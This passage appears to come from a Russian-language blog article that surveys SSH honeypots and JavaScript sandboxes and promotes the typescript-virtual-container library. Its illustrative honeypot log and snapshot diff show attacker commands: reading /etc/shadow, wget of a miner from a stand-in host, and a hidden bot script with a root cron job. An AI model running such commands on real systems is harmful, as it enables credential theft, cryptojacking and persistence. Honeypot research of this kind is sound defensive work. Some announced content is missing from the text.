Kippo это оригинальный SSH-honeypot средней интерактивности, на котором был основан Cowrie. Та же базовая идея : настоящий протокол SSH, поддельная файловая система, частичный шелл. Cowrie его к этому моменту полностью вытеснил -- Kippo заархивирован, и никто не должен его использовать в 2026. Упомянут здесь чисто для исторической полноты, раз можешь встретить его в старых блог-постах и security-пейперах.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo) -- заархивирован

### 4.3 endlessh -- SSH-tarpit

endlessh это вырожденный honeypot : он держит SSH-соединения открытыми, медленно соча данные баннера по 1 байту в секунду (или меньше). SSH-клиент, подключающийся к нему, застрянет навсегда -- он никогда не дойдёт до аутентификации, потому что сервер никогда не заканчивает отправлять баннер.

Цель не threat intelligence, а чистый отказ в ресурсе : занимать скан-треды атакующих, чтобы они не могли так быстро достигать настоящих целей. Это честно слегка дьявольски в хорошем смысле. Ты ничего не узнаёшь об атакующем -- ты просто тратишь его время. В этом есть что-то глубоко приятное.

```c
// Всё протокольное поведение endlessh :
// Отправить : "SSH-2.0-OpenSSH_" затем медленно добавлять случайные символы
// Никогда не закрывать соединение
// Сканер атакующего истекает через N секунд
```

Никакие команды не захватываются. Никакая аутентификация не тестируется. Только время соединения.

**Написан на** : C
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

### 4.4 sshesame -- honeypot "впускать всех"

sshesame принимает все SSH-соединения (любой пользователь, любой пароль, любой ключ) и всё записывает. Это honeypot нулевой интерактивности : он не отвечает на команды, он просто впускает атакующих и записывает каждое нажатие, что они печатают.

```
2024-01-15 03:22:11 Соединение от 45.33.32.156
  Пользователь : root, Пароль : password123 -- принят
  Набранные команды :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Отключён через 47s
```

Полезен для сбора учёток : быстро накапливаешь имена пользователей и пароли, пробуемые ботами, что говорит, какие дефолтные учётки сейчас активно брутфорсятся. Спойлер : это всегда `root`/`password`, `admin`/`admin` и `root`/`123456`. Каждый раз.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

Базовый образ даёт фреймворк логирования, плагинную систему для протоколов и конфигурации Docker Compose для мультисервисных honeypot. Ты расширяешь его, чтобы симулировать конкретные сервисы.

### 4.6 Построить SSH-honeypot на Node.js -- наивный метод, и почему он проваливается

До `typescript-virtual-container` построить SSH-honeypot на Node.js значило комбинировать настоящую библиотеку `ssh2` с ручной симуляцией команд. Очень утомительно, очень неполно, но... это обряд посвящения на этом этапе :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Залогировать попытку
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Впускать всех
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Симулированный ответ
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Это "работает" в том смысле, что захватывает учётки и команды. Но это очевидно фальшиво, как только искусный атакующий копнёт слегка. `uname -a` возвращает правильную строку, а `ls /etc` возвращает "command not found" -- пахнет ловушкой за версту. Файловой системы нет. Команды не чейнятся. Пайпы не работают. Переменные не экспандятся.

Компетентный атакующий опознает твой honeypot за первые пять команд. Автоматизированные скрипты, ищущие Cowrie-подобное поведение, тоже его сразу детектят. Видимо это и толкнуло автора `typescript-virtual-container` построить нечто, реально интерпретирующее команды по-настоящему -- больше об этом в Части 5.

## Часть 5 -- `typescript-virtual-container` : что закрывает разрыв

Так, здесь становится интересно. После каталогизации всех семейств выше недостающий квадрант становится довольно очевиден :

- JS-песочницы : изолируют код, без шелла, без файловой системы, без SSH
- Эмуляторы Linux : настоящая ОС, настоящий шелл, настоящий SSH... но 150+ МБ RAM, 30 секунд старта, и надо строить собственный API поверх серийного I/O
- Honeypot : поддельный шелл, без программируемого API, Python/Go/C, не нативный Node

Никто не построил полное, программируемое, нативное для Node окружение Linux с настоящим SSH, настоящими правами, настоящей виртуальной сетью и типизированным TypeScript API. Так что она его построила.

Короткое введение, раз впервые упоминаю её корректно : `typescript-virtual-container` построен [Хлоэ Рольсхаузен](https://itsrealfortune.fr), французской разработчицей, называющей себя **Fortune** (или ItsRealFortune) онлайн. Найти её можно на её [сайте](https://itsrealfortune.fr) и в [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Весь проект -- 56 000 строк TypeScript, 247 файлов, 170 команд -- был соло-усилием одного человека. Дальше в статье буду звать её Fortune. И да, это довольно дико. Глянь её работу!

### Что это реально такое

`typescript-virtual-container` это **симулятор окружения Linux**, написанный на чистом TypeScript. Без Wasm, без нативных расширений, без ядра. ~56 000 строк исходников на 247 файлах TypeScript.

Ключевая проницательность : не нужен эмулятор CPU, чтобы заставить работать `ls /etc | grep passwd`. Нужно :
1. Дерево узлов в памяти, отвечающих на операции путей
2. Модель разрешений POSIX, применяемая при каждом доступе
3. Синтаксический анализатор шелла, понимающий пайплайны, редиректы, субшеллы и экспансию переменных
4. ~170 реализаций команд (функции, а не бинари)
5. Система управления пользователями и группами
6. Что-то, выставляющее всё это через SSH

Всё это реализуемо на чистом TypeScript безо всякого вовлечения ядра.

### VirtualFileSystem

VFS это дерево типизированных узлов в памяти -- без дискового I/O, если явно не включить режим персистентности `"fs"` :

```ts
// Упрощённое внутреннее представление
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // плейсхолдер, грузящийся лениво
```

Каждая операция пути идёт через `normalizePath` (резолвит `.`, `..`, симлинки) и `enforceAccess` (проверяет разрешения чтения/записи/исполнения относительно запрашивающих uid/gid). `chmod`, `chown`, sticky-биты и setuid всё реализовано и реально применяется. Если процесс под uid 1000 пытается читать файл рута с модом 0600, он получает EACCES -- не поддельный EACCES, настоящую JS-`Error`, брошенную из проверки разрешений. Эта часть довольно элегантна, честно.

VFS сериализуется в :
- `.vfsb` -- компактный бинарный формат (кастомный, с компрессией fflate) -- это дефолтный формат
- JSON-снапшот -- читаемый человеком, хорош для дебага
- TAR-архив -- импорт/экспорт с настоящим tar-форматом, так что можешь `tar -xf` что-то, и у VFS просто... эти файлы
- SquashFS-образ -- импорт только для чтения

В режиме персистентности `"fs"` он держит журнал упреждающей записи (WAL) для восстановления после краша -- записи сначала идут в журнал, затем в снапшот при флаше. Если Node упадёт посреди операции, журнал позволит реконструировать последнее полное состояние.

Есть ещё слой `FileCache`, симулирующий задержку дискового I/O. Настраиваешь профили вроде `NVME_DISK_IO` или `HDD_DISK_IO`, и VFS искусственно задерживает файловые операции, чтобы соответствовать реалистичным таймингам. Довольно смешно -- софт, намеренно себя замедляющий, чтобы симулировать железо -- но на деле очень полезно для бенчмаркинга.

### Интерпретатор шелла

Синтаксический анализатор шелла выдаёт типизированный AST :

```ts
// "ls /etc | grep root && echo done" парсится в :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Исполнитель проходит этот AST :
- Для пайплайна создаёт цепочку потоков `{ stdin, stdout, stderr }` и исполняет каждую команду с пайплайновым I/O
- Для логических операторов (`&&`, `||`) проверяет `$?` после левой стороны, прежде чем исполнять правую
- Для субшеллов (`$(...)`, `` ` ` ``) форкает контекст исполнения
- Для редиректов (`>файл`, `>>файл`, `2>&1`, `<файл`) настраивает проводку потоков до исполнения
- Для фоновых задач (`cmd &`) исполняется не дожидаясь конца
- Для переменных экспандит `$VAR`, `${VAR:-default}`, `${#VAR}` и арифметику `$((expr))`
- Для экспансии скобок (`{a,b,c}`, `{1..5}`) генерирует полный список экспансии до исполнения

Всё это настоящее поведение POSIX-шелла. Парсер управляет heredoc, подстановкой процессов, глоббингом (`*`, `?`, `[abc]`) и управлением кавычками (одинарные, двойные с интерполяцией, экранирование бэкслэшем). Не идеально -- пограничные случаи есть -- но сильно выше того, чего ждёшь от TypeScript-проекта.

### ~170 встроенных команд

Команды это TypeScript-функции, зарегистрированные в реестре команд. Они получают `CommandContext` с потоками stdin/stdout/stderr, VFS, пользовательской сессией, окружением шелла и доступом к подмодулям.

Написать 170 реализаций Unix-команд это... много. Некоторые тривиальны (`echo`, `true`, `false`), некоторые удивительно сложны (`awk`, `find`, `tar`). Типа, полный POSIX `awk`? На TypeScript? Это дико, честно. Вот выборка содержимого :

Для honeypot они на деле полезнее настоящих команд, потому что позволяют наблюдать, что атакующие пытаются исполнять, ничего опасного не исполняя.

### SSH-сервер

Слой SSH использует настоящий npm-пакет `ssh2` -- настоящий протокол SSH, настоящий обмен ключами, настоящее шифрование. `SSHMimic` оборачивает его :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Настоящий SSH : ssh -p 2222 root@localhost
// Настоящий SFTP : sftp -P 2222 root@localhost
// Настоящий SCP : scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` определяют, что рапортуют `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` и `/etc/os-release`. Можешь убедительно имитировать любой дистрибутив Linux и версию ядра -- для настоящего SSH-клиента буквально нет способа отличить.

### Модуль HoneyPot

Поскольку интерпретатор шелла настоящий, а SSH-сервер настоящий, команды атакующих реально исполняются в виртуальном окружении. Запускаемые атакующим `wget`-запросы логируются с URL назначения. Создаваемые атакующим файлы сохраняются в VFS. Попытки эскалации привилегий дают реалистичные ошибки.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// После сессии дифференцировать файловую систему
const before = shell.vfs.toSnapshot();
// ... сессия атакующего ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Это качественно отлично от Cowrie. Поддельная файловая система Cowrie может ответить на `ls`, но не может реально отслеживать созданные атакующим файлы и внесённые изменения как структурированный diff. `typescript-virtual-container` может, потому что VFS живая структура данных -- каждая запись отслеживается. Этот cron, только что добавленный атакующим? Он в diff. Эта папка `.hidden`? В diff. Довольно полезно для анализа малвари.

### Виртуальная сетевая стопа

Это, наверное, впечатляющая часть всего проекта, и у неё нет эквивалента ни в одном другом проекте этого пространства. Типа, полная виртуальная сетевая стопа L2/L3 с поддержкой VPN, написанная на чистом TypeScript, безо всякой реальной сетевой карты. Это реально дико.

`VirtualNetworkManager` даёт каждому инстансу `VirtualShell` виртуальные сетевые интерфейсы с настраиваемыми IP-адресами, таблицами маршрутизации и софтвенным фаерволом (правила в стиле iptables с conntrack и NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` все показывают состояние виртуальной сети.

`VirtualSwitch` (названный Baie -- от французского слова для серверной стойки, "baie informatique") соединяет несколько шеллов в общей подсети. Он реализует :
- Изучение MAC и ARP
- IP-маршрутизацию между подсетями
- NAT (исходящее маскарадирование)
- DNS (настраиваемые записи на подсеть)
- Балансировку нагрузки (round-robin, наименьшие соединения)
- Формирование трафика : задержка, джиттер (гауссово распределение), потеря пакетов, потеря пачками, переупорядочивание, дублирование
- Лимитирование полосы (token bucket)
- Применение MTU
- Отслеживание соединений (с состоянием, состояния NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Три виртуальные машины на одном коммутаторе
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Фаервол : web может достигать api, api может достигать db, web не может достигать db напрямую
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Формирование трафика : симулировать нестабильный WAN-линк наружу
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` создаёт шифрованные туннели между инстансами Baie -- можно симулировать мультисайтовую сеть с VPN-интерконнектами между сайтами.

`VirtualProxy` реализует форвардинг портов и SOCKS5-прокси.

Ничего из этого не касается настоящей сетевой карты. Всё это роутинг TypeScript-объектов. Команда `ping` "работает", роутясь через виртуальный коммутатор и возвращая симулированные ICMP-ответы. `curl http://192.168.0.3/api` роуттится через виртуальную сеть, достигает симулированного HTTP-ответа шелла api и возвращает содержимое. Это черепахи донизу, в лучшем смысле.

### `SandboxedShell`

Для программного использования, где нужна более сильная изоляция, `SandboxedShell` исполняет шелл-сессию в треде Worker Node.js :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% ядра
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

Изоляция здесь обеспечивается слоем VFS (шелл воркер-треда видит только виртуальную файловую систему, никогда хостовую) плюс изоляцией памяти треда Worker Node.js. Это легче `isolated-vm`, но уместнее для изоляции уровня шелла, а не уровня JS.

### Потолок ресурсов

Можно настраивать лимиты ресурсов на шелл, влияющие на то, что рапортуют команды системного мониторинга :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Внутри этого шелла `free -m` показывает 512 МБ общей RAM. `nproc` возвращает 2. `/proc/meminfo` показывает урезанные значения. `htop` и `top` показывают урезанное число CPU. Это позволяет точно задавать железный футпринт симулированной машины.

### Полифиллы -- как браузерный билд работает без Wasm

Так, это часть, кажущаяся мне правда умной, и её хотелось подсветить специально.

Заставить библиотеку Node.js работать в браузере обычно кошмар. Либо используешь Wasm-рантайм (тяжёлый, медленно грузится), либо неделями вручную заменяешь каждый импорт `node:*` браузерно-совместимой альтернативой. Fortune сделала второе -- но очень чисто, написав набор кастомных полифиллов, живущих в каталоге `polyfills/` репозитория.

Пайплайн сборки это просто esbuild с кучей входов `alias` :

```js
// demo/build.js -- вся конфигурация браузерного билда
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Без Wasm, без внешней библиотеки полифиллов, без прибегания к `webpack-node-externals`. Только алиаснутые модули и несколько впрыснутых глобалов. Дай детализировать каждый, потому что некоторые реально впечатляют.

**`node:fs` -- IndexedDB как поддельная файловая система**

Это мой любимый. Полифилл `node:fs` реализует синхронный API Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) на двух слоях : `Map` в памяти для синхронных чтений и IndexedDB для персистентности между перезагрузками страницы. Записи идут в Map сразу (так что `readFileSync` сразу после `writeFileSync` всегда работает), затем сливаются в IndexedDB асинхронно в фоне.

```js
// Синхронный кэш (путь → Uint8Array | null) -- мгновенные чтения
const memCache = new Map();

// Предзагрузить всё из IndexedDB в memCache на старте
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Это причина, по которой снапшот VFS переживает перезагрузки страницы в браузере -- целый бинарь `.vfsb` пишется в IndexedDB через этот полифилл и читается при следующей загрузке. Без Wasm, без сервера. Только IndexedDB, бывший во всех браузерах с 2011.

**`node:crypto` -- SHA-256 на чистом JS**

Вместо импорта Wasm-криптобиблиотеки криптополифилл реализует SHA-256 с нуля, используя константы раундов FIPS 180-4. 166 строк чистого JS с полной поддержкой выходов hex/base64/Uint8Array. Всё хеширование в библиотеке идёт через него -- отпечаток хостовых ключей SSH, внутренние контрольные суммы, всё. Компактно, ноль зависимостей, работает.

**`node:os` -- читает настоящее железо браузера**

Здесь милое внимание. Вместо возврата зашитых фиктивных значений `node:os` читает `navigator.deviceMemory` для общей RAM и `navigator.hardwareConcurrency` для числа CPU. Так что `neofetch` в браузерном билде рапортует нечто, соответствующее твоей настоящей машине -- а не дурацкий стаб `2 ядра, 2 ГБ RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 ГБ по умолчанию
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // также парсит navigator.userAgent, чтобы угадать строку модели CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- честные стабы**

Браузер не может открывать TCP-сокеты или исполнять настоящий SSH, так что это стабы, бросающие ошибку `NotImplemented` с ясным сообщением, если что-то пытается их использовать. Падения остаются явными, без возвращённого `undefined` там, где ожидается объект. Только громкое ясное "это не работает в браузере" -- ровно то, что надо.

**`process.js` и `buffer.js` -- впрыснутые глобалы**

Эти двое впрыскиваются наверх каждого файла бандла через опцию `inject` esbuild, так что `process` и `Buffer` доступны глобально безо всякого явного импорта. `process.js` крошечный : `env`, `version`, `platform: 'browser'`, `nextTick` через `queueMicrotask`, `uptime` через `performance.now()`. `buffer.js` это полная реимплементация `Buffer` поверх `Uint8Array` -- все методы `readUInt32BE`, `writeInt16LE`, кодировки hex/base64, от которых зависят реализация SSH и VFS.

## Когда что использовать

**Надо исполнять ненадёжный JavaScript -- пользовательская формула, плагин, скриптовый хук.**
→ `isolated-vm`. Настоящий V8 Isolate, строгие лимиты памяти, явный коммуникационный мост. Избегай `vm2` -- список CVE только растёт, серьёзно это как новая каждые несколько месяцев. Избегай `vm` -- это вообще не песочница, пожалуйста.

**Надо изолировать JS без нативного расширения или нужна совместимость с браузером.**
→ `quickjs-emscripten`. Граница Wasm, модуль около 500 КБ, работает в браузерах и Node. Медленнее V8, но реально изолирован.

**Надо забутить настоящую немодифицированную ОС Linux с бинарной совместимостью.**
→ `v86` для 32-битного Linux или `container2wasm`, если есть существующий образ Docker. Прими 150+ МБ RAM и 30 секунд старта, таков дил. Если нужен 64-бит, смотри CheerpX или просто используй настоящий рантайм контейнеров.

**Надо встроить Linux-подобный терминал в веб-приложение без бэкенда.**
→ `v86` (полная ОС, тяжёлая, медленно стартует) или браузерный бандл `typescript-virtual-container` (симулятор, легче, мгновенный старт, включает `startxfce4` для полного рабочего стола, что довольно круто).

**Нужны интерактивные онлайн туториалы кодинга или браузерный IDE.**
→ WebContainers, если сфокусирован на экосистеме Node.js. CheerpX, если нужен настоящий юзерспейс Linux. Браузерный бандл `typescript-virtual-container`, если хочешь более лёгкий вариант с типизированным API.

**Хочешь собирать TTP SSH-атакующих в большом масштабе.**
→ Cowrie это продовый стандарт, точка. Крутится на любом сервере Linux, интегрируется со всеми SIEM, теперь имеет LLM-режим. Просто используй Cowrie.

**Хочешь данные SSH-honeypot в приложении Node.js с программируемым API.**
→ `typescript-virtual-container`. Команды реально исполняются. VFS настоящая структура данных, которую можешь мгновенно снимать и дифференцировать. Атакующий получает убедительное интерактивное окружение, а ты получаешь структурированные аудит-данные, не уходя из Node.

**Нужна шелл-автоматизация / тесты в CI без Docker.**
→ `typescript-virtual-container`. Стартует меньше чем за секунду, снапшот перед тестом, восстановление после. Исполняй шелл-команды с типизированным API. Без демона Docker, без ядра, без VM, без ожидания.

**Нужны мультитенантные шелл-окружения (SaaS, образование, обучение).**
→ `typescript-virtual-container`. 5-20 МБ на инстанс против 150-256 МБ у эмулятора. 100 одновременных пользователей : ~2 ГБ против ~25 ГБ. Это большая разница в хостинговых затратах!

**Нужен реалистичный honeypot, позволяющий строить мульти-VM сетевую лабу.**
→ `typescript-virtual-container` единственное в этом пространстве, делающее оба.

## Чего он не может (и хочу быть честен)

Он не может исполнять нативные x86-бинари. Если надо компилировать C-код, исполнять настоящий интерпретатор Python или использовать софт, скомпилированный для Linux, нет ядерного ABI для поддержки этих системных вызовов. Команды вроде `gcc`, `python3` и `node` это стабы -- они отвечают на `--version` и распространённые вызовы, но ничего реального не исполняют.

Это фундаментальный компромисс : выигрываешь в 10-50 раз меньше памяти, мгновенный старт, совместимость с браузером, типизированный API, настоящий SSH и виртуальную сеть -- и отказываешься от бинарной совместимости с юзерспейсом Linux.

Fortune много думала об этом, проектируя проект. Для юзкейсов, что она целила -- honeypot, тесты, встроенные терминалы, CI-окружения -- исполнение скомпилированного бинаря на деле никогда не нужно. Шелл-пайплайны, манипуляция файлами, сетевая маршрутизация и SSH покрывают всё. Но если твой юзкейс требует настоящего скомпилированного софта, `v86` или Docker правильный ответ, а не это.

## В заключение

Так что вот. Эта экосистема шире и фрагментированнее, чем кажется снаружи. `vm` это разделитель области, а не песочница. `vm2` продолжает копить CVE (реально, смотри бюллетени этого месяца). `isolated-vm` правильный ответ для изоляции JS, но только JS. `quickjs-emscripten` правильный выбор, когда нужна совместимость с браузером или хочешь избежать нативных расширений. `v86` и CheerpX настоящие эмуляторы, когда нужна настоящая бинарная совместимость. WebContainers это Node.js в Wasm, а не обобщённое окружение Linux. Cowrie золотой стандарт SSH-honeypot, но это Python, а не нативный Node.

А затем есть `typescript-virtual-container` -- проект Fortune -- живущий слегка в собственной категории. Ни эмулятор, ни JS-песочница, ни пассивный honeypot. Нечто между всем, оказавшееся удивительно полезным для многого, чего никто из остальных не может.

`typescript-virtual-container` закрывает разрыв, которого не касается никто из остальных : полное программируемое шелл-окружение Linux с настоящим SSH, SFTP, разрешениями POSIX, управлением пользователями, виртуальной сетью и типизированным TypeScript API -- крутящееся примерно в 10 МБ, стартующее меньше чем за секунду, работающее и в Node.js, и в браузере.

Если хочешь попробовать : исходник на [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container), а онлайн-демо (включая `startxfce4` для полного рабочего стола, что откровенно больно) на [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Глянь и оставь Fortune звёзд на GitHub, она их заслужила!

Спасибо, что прочитал -- это было длинно даже по моим стандартам :) надеюсь, было полезно!
